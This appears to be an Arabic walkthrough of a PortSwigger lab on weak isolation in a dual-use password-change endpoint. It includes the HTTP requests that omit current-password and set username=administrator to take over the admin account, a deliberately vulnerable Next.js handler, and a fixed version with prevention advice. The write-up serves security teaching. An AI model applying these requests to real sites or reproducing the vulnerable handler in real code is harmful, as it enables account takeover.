# Lab: Weak isolation on dual-use endpoint

> **Category:** Business Logic  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - Weak isolation on dual-use endpoint](https://portswigger.net/web-security/logic-flaws/lab-weak-isolation-on-dual-use-endpoint)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة منطق العمل (Business Logic) في **نقطة نهاية مزدوجة الاستخدام (dual-use endpoint)**. نفس الـ endpoint يستخدم لتغيير كلمة المرور بناءً على معامل `username`. إذا حذفنا معامل `current-password`، يمكننا تغيير كلمة مرور أي مستخدم (بما في ذلك `administrator`) دون معرفة كلمته الحالية.

**الحساب:** `wiener:peter`

**المطلوب:** تغيير كلمة مرور `administrator`، ثم تسجيل الدخول بحسابه وحذف `carlos`.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: تسجيل الدخول

- سجل الدخول بـ `wiener:peter`
- اذهب إلى **My account**

### الخطوة 2: اعتراض طلب تغيير كلمة المرور

- قم بتغيير كلمة مرورك (اختر أي كلمة جديدة)
- اعترض طلب `POST /my-account/change-password` في Burp:

```http
POST /my-account/change-password HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded

username=wiener&current-password=peter&new-password=test123&confirm-password=test123
```

### الخطوة 3: إرسال الطلب إلى Repeater

- زر الماوس الأيمن → **Send to Repeater**

### الخطوة 4: حذف معامل current-password

- احذف `&current-password=peter` بالكامل من الطلب:

```http
POST /my-account/change-password HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded

username=wiener&new-password=test123&confirm-password=test123
```

### الخطوة 5: إرسال الطلب

- اضغط **Send**

**النتيجة:** تم تغيير كلمة مرور `wiener` بنجاح ✅

**ملاحظة:** هذا يعني أن الخادم لا يتحقق من وجود `current-password`! إذا تم حذفه، يسمح بتغيير كلمة المرور بدون التحقق من القديمة.

### الخطوة 6: تغيير username إلى administrator

- غيّر `username=wiener` إلى `username=administrator`:

```http
POST /my-account/change-password HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded

username=administrator&new-password=test123&confirm-password=test123
```

### الخطوة 7: إرسال الطلب

- اضغط **Send**

**النتيجة:** تم تغيير كلمة مرور `administrator` بنجاح ✅

### الخطوة 8: تسجيل الخروج

- في المتصفح، قم بتسجيل الخروج (Log out)

### الخطوة 9: تسجيل الدخول بحساب administrator

- سجل الدخول باستخدام:
  - **Username:** `administrator`
  - **Password:** `test123` (أو كلمة المرور التي استخدمتها)

### الخطوة 10: الوصول إلى /admin وحذف carlos

- اذهب إلى `/admin`
- اضغط على زر **Delete** بجانب `carlos`

### الخطوة 11: حل المختبر

بعد حذف `carlos`، سيتم حل المختبر تلقائياً ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ما هو dual-use endpoint؟** | نقطة نهاية تؤدي وظيفتين مختلفتين حسب السياق (مثل تغيير كلمة المرور مع أو بدون التحقق من القديمة) |
| **أين الثغرة؟** | الخادم لا يتحقق من وجود معامل `current-password`، ويسمح بتغيير كلمة المرور بدونه |
| **لماذا هذا خطأ؟** | يجب أن يكون تغيير كلمة المرور مستحيلاً بدون معرفة كلمة المرور الحالية |
| **كيف نستغلها؟** | نحذف `current-password` ونغير `username` إلى أي مستخدم نريده |
| **ما هو weak isolation؟** | عزل ضعيف بين الوظائف المختلفة لنفس الـ endpoint |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

نقطة النهاية `POST /my-account/change-password` تؤدي وظيفتين:
1. تغيير كلمة المرور مع التحقق من القديمة (عند وجود `current-password`)
2. تغيير كلمة المرور بدون تحقق (عند عدم وجود `current-password`)

الخادم لا يتحقق من أن المستخدم الحالي يملك صلاحية تغيير كلمة مرور مستخدم آخر.

---

### ❌ Non-Compliant Code (Next.js)

```javascript
// pages/api/change-password.js
export default function handler(req, res) {
  const { sessionId } = req.cookies;
  const { username, currentPassword, newPassword, confirmPassword } = req.body;
  
  const currentUser = getUserBySession(sessionId);
  
  if (!currentUser) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  // خطأ: إذا لم يتم إرسال current-password، يسمح بتغيير كلمة المرور بدون تحقق
  if (currentPassword) {
    if (currentUser.password !== currentPassword) {
      return res.status(400).json({ error: 'Current password is incorrect' });
    }
  }
  // إما لا يوجد current-password → يسمح بالتغيير!
  
  if (newPassword !== confirmPassword) {
    return res.status(400).json({ error: 'Passwords do not match' });
  }
  
  // خطأ: يسمح بتغيير كلمة مرور أي مستخدم (وليس فقط المستخدم الحالي)
  const targetUser = getUserByUsername(username);
  if (!targetUser) {
    return res.status(404).json({ error: 'User not found' });
  }
  
  updateUserPassword(targetUser.id, newPassword);
  res.json({ success: true });
}
```

---

### ✅ Compliant Code (Next.js)

```javascript
// pages/api/change-password.js
export default function handler(req, res) {
  const { sessionId } = req.cookies;
  const { currentPassword, newPassword, confirmPassword } = req.body;
  
  const currentUser = getUserBySession(sessionId);
  
  if (!currentUser) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  // التصحيح 1: التحقق من وجود current-password إلزامياً
  if (!currentPassword) {
    return res.status(400).json({ error: 'Current password is required' });
  }
  
  // التصحيح 2: التحقق من صحة كلمة المرور الحالية
  if (currentUser.password !== currentPassword) {
    return res.status(400).json({ error: 'Current password is incorrect' });
  }
  
  if (newPassword !== confirmPassword) {
    return res.status(400).json({ error: 'Passwords do not match' });
  }
  
  // التصحيح 3: استخدام المستخدم الحالي فقط (لا نسمح بتغيير مستخدم آخر)
  updateUserPassword(currentUser.id, newPassword);
  res.json({ success: true });
}
```

**الخلاصة:** 
1. لا تسمح أبداً بتغيير كلمة المرور بدون التحقق من القديمة
2. لا تسمح بتغيير كلمة مرور مستخدم آخر (استخدم المستخدم الحالي فقط من الجلسة)
3. لا تعتمد على معامل `username` من العميل

---

## 🛡️ كيفية الوقاية (How to Prevent)

1. **إلزامية التحقق من كلمة المرور الحالية:** دائماً اطلب `current-password`.
2. **استخدم المستخدم من الجلسة:** لا تقبل معامل `username` من العميل لتحديد المستخدم.
3. **التحقق من الصلاحية:** تأكد أن المستخدم الحالي هو من يغير كلمته فقط.
4. **فصل الوظائف:** استخدم endpoints مختلفة لتغيير كلمة المرور (مع وبدون تحقق) إذا لزم الأمر.

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/logic-flaws/lab-weak-isolation-on-dual-use-endpoint)
- [Business Logic Vulnerabilities](https://portswigger.net/web-security/logic-flaws)
